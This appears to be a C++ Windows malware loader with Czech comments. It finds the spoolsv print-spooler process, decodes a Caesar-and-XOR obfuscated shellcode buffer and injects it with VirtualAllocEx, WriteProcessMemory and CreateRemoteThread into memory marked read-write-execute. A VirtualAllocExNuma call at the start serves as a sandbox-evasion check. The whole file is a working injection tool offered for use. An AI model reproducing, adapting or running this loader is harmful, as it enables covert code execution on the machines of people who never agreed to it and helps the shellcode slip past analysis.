#include <Windows.h>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <tlhelp32.h>
#include <iostream>

FARPROC getHandler(HMODULE module, std::string procName) {
    return GetProcAddress(module, procName.c_str());
}

FARPROC getHandler(std::wstring module, std::string procName) {
    return GetProcAddress(LoadLibraryW(module.c_str()), procName.c_str());
}

inline uint8_t _xor(uint8_t orig, uint8_t* key, uint8_t keyl) {
    return ([&]()->uint8_t {
        for (int i = 0; i < keyl; i++) { orig ^= key[i]; } return orig; }()) & 0xFF;
}

inline uint8_t _ceasar(uint8_t orig, uint8_t shift) {
    return ((orig + shift) & 0xFF);
}


int main(int argc, wchar_t **argv)
{
    LPVOID duleziteBlbec = VirtualAllocExNuma(GetCurrentProcess(), nullptr, 0x1000, 0x3000, 0x4, 0);
    if (!duleziteBlbec) {
        return 0;
    }       
    
    if (argc < 2) {
        std::wcerr << "[!] Naval process co chces zborat" << std::endl;
        return 0;
    }
    DWORD pid{ 0 };
    /**********/
    HANDLE pSnapShooter = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (pSnapShooter == INVALID_HANDLE_VALUE) {
        std::wcerr << "[!] CreateToolhelp32Snapshot failed" << std::endl;
        return -1;
    }
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(pSnapShooter, &pe32)) {
        std::wcerr << "[!] Process32First" << std::endl;
        return -1;
    }
    
    do {
        std::wstring procName = pe32.szExeFile;
        if (procName.find(L"spoolsv") != std::wstring::npos) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(pSnapShooter, &pe32));
    CloseHandle(pSnapShooter);
    if (pid == 0) {
        std::wcerr << "[!] PID == 0? Nepredpokladam ze je to ok" << std::endl;
        return -1;
    }
    std::wcerr << "[*] Close impact" << std::endl;
    /**********/    
    uint8_t ebuff[]={"\xf9\x45\x7e\xe1\xed\xe5\xc9\xfd\xfd\xfd\x3c\x4c\x3c"
"\x4d\x4f\x4c\x45\x2c\xcf\x53\x60\x45\x86\x4f\x5d\x45"
"\x86\x4f\x15\x45\x86\x4f\x1d\x45\x0a\xb2\x47\x47\x48"
"\x2c\xc4\x45\x86\x6f\x4d\x45\x2c\xbd\xa9\x39\x5c\x79"
"\xff\x29\x1d\x3c\xbc\xc4\x08\x3c\xfc\xbc\xdf\xe8\x4f"
"\x45\x86\x4f\x1d\x3c\x4c\x86\x3f\x39\x45\xfc\xcd\x63"
"\x7c\x75\x15\x06\xff\x0a\x80\x6f\xfd\xfd\xfd\x86\x7d"
"\x85\xfd\xfd\xfd\x45\x80\xbd\x71\x62\x45\xfc\xcd\x41"
"\x86\x3d\x1d\x86\x45\x15\x4d\x44\xfc\xcd\xde\x53\x48"
"\x2c\xc4\x45\xfa\xc4\x3c\x86\x31\x85\x45\xfc\xd3\x45"
"\x2c\xbd\xa9\x3c\xbc\xc4\x08\x3c\xfc\xbc\x35\xdd\x70"
"\xec\x49\xfe\x49\x21\x05\x40\x34\xcc\x70\xd5\x55\x41"
"\x86\x3d\x21\x44\xfc\xcd\x63\x3c\x86\x09\x45\x41\x86"
"\x3d\x19\x44\xfc\xcd\x3c\x86\x01\x85\x3c\x55\x3c\x55"
"\x45\xfc\xcd\x5b\x54\x57\x3c\x55\x3c\x54\x3c\x57\x45"
"\x7e\xe9\x1d\x3c\x4f\xfa\xdd\x55\x3c\x54\x57\x45\x86"
"\x0f\xe4\x46\xfa\xfa\xfa\x58\x45\x2c\xd6\x4e\x44\xbb"
"\x72\x64\x6b\x64\x6b\x60\x71\xfd\x3c\x53\x45\x84\xdc"
"\x44\xc2\xbf\x49\x72\x23\x02\xfa\xd0\x4e\x4e\x45\x84"
"\xdc\x4e\x57\x48\x2c\xbd\x48\x2c\xc4\x4e\x4e\x44\xb7"
"\x37\x53\x74\xa2\xfd\xfd\xfd\xfd\xfa\xd0\xe5\x0d\xfd"
"\xfd\xfd\x2c\x34\x2f\x2b\x2c\x33\x35\x2b\x2c\x2f\x2f"
"\x2b\x2c\x2c\x2e\xfd\x57\x45\x84\xbc\x44\xc2\xbd\xb6"
"\xfc\xfd\xfd\x48\x2c\xc4\x4e\x4e\x67\xfe\x4e\x44\xb7"
"\x52\x84\x9a\xc3\xfd\xfd\xfd\xfd\xfa\xd0\xe5\x6d\xfd"
"\xfd\xfd\x2a\x6d\x50\x51\x44\x77\x77\x47\x68\x67\x28"
"\x63\x60\x69\x4b\x28\x52\x70\x28\x60\x69\x4e\x62\x4e"
"\x51\x2c\x5a\x48\x4b\x33\x71\x44\x60\x6b\x5e\x3e\x74"
"\x5a\x60\x42\x44\x4b\x77\x43\x42\x63\x3f\x41\x28\x51"
"\x61\x46\x2d\x68\x61\x48\x70\x47\x44\x48\x47\x5f\x33"
"\x34\x5c\x46\x67\x57\x75\x41\x47\x52\x72\x4d\x63\x69"
"\x6c\x45\x72\x70\x2c\x2f\x4a\x55\x60\x3e\x68\x71\x6c"
"\x48\x40\x54\x55\x54\x47\x4c\x35\x66\x60\x52\x4c\x60"
"\x45\x3e\x34\x66\x34\x64\x57\x50\x68\xfd\x45\x84\xbc"
"\x4e\x57\x3c\x55\x48\x2c\xc4\x4e\x45\xb5\xfd\x2f\xa5"
"\x81\xfd\xfd\xfd\xfd\x4d\x4e\x4e\x44\xc2\xbf\xe6\x50"
"\x2b\x36\xfa\xd0\x45\x84\xc3\x67\x07\x5a\x45\x84\xec"
"\x67\x1a\x57\x4f\x65\x7d\x2e\xfd\xfd\x44\x84\xdd\x67"
"\x01\x3c\x54\x44\xb7\x70\x43\x9b\x83\xfd\xfd\xfd\xfd"
"\xfa\xd0\x48\x2c\xbd\x4e\x57\x45\x84\xec\x48\x2c\xc4"
"\x48\x2c\xc4\x4e\x4e\x44\xc2\xbf\x28\x03\x15\x76\xfa"
"\xd0\x80\xbd\x70\x1a\x45\xc2\xbc\x85\x0e\xfd\xfd\x44"
"\xb7\x41\xed\x30\xdd\xfd\xfd\xfd\xfd\xfa\xd0\x45\xfa"
"\xca\x71\xff\xe6\xa7\xe5\x50\xfd\xfd\xfd\x4e\x54\x67"
"\x3d\x57\x44\x84\xcc\xbc\xdf\x0d\x44\xc2\xbd\xfd\x0d"
"\xfd\xfd\x44\xb7\x55\xa1\x4e\xe0\xfd\xfd\xfd\xfd\xfa"
"\xd0\x45\x8e\x4e\x4e\x45\x84\xe2\x45\x84\xec\x45\x84"
"\xd7\x44\xc2\xbd\xfd\x1d\xfd\xfd\x44\x84\xf4\x44\xb7"
"\x0f\x93\x84\xdf\xfd\xfd\xfd\xfd\xfa\xd0\x45\x7e\xc1"
"\x1d\x80\xbd\x71\xaf\x63\x86\x02\x45\xfc\xbe\x80\xbd"
"\x70\xcf\x55\xbe\x55\x67\xfd\x54\x44\xc2\xbf\xed\xb0"
"\x9f\x53\xfa\xd0"};

unsigned char kl = 8;

int bufsz {667};
uint8_t key[] {'2','1','_','2','6','_','0','6',};
std::unique_ptr<uint8_t []> buf{std::make_unique<uint8_t[]>(667)};
for (uint32_t i = 0; i < 667;i++) {
    buf[i] = _xor(_ceasar(ebuff[i], 4), key, kl); }



    std::wcerr << "[i] Want to spawn spoolsv PID: " << pid << std::endl;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (hProcess) {
        std::wcerr << "[i] Opened process handle" << std::endl;
        LPVOID zakernaAdresa = VirtualAllocEx(hProcess, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (zakernaAdresa) {
            SIZE_T zapsanechBajtu{ 0 };
            if (WriteProcessMemory(hProcess, zakernaAdresa, buf.get(), bufsz, &zapsanechBajtu)) {
                HANDLE procesRemVlakno = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)zakernaAdresa, nullptr, 0, nullptr);
                if (procesRemVlakno != INVALID_HANDLE_VALUE) {
                    std::wcerr << "[i] Created remote thread " << std::endl;
                    //WaitForSingleObject(procesRemVlakno, -1);
                }
                else
                    std::wcerr << "[!] CreateRemoteThread " << GetLastError() << std::endl;
            }
            else
                std::wcerr << "[!] WriteProcessMemory " << GetLastError() << std::endl;
        }
        else
            std::wcerr << "[!] VirtualAllocEx " << GetLastError() << std::endl;
    }
    else
        std::wcerr << "[!] OpenProcess " << GetLastError() << std::endl;
}
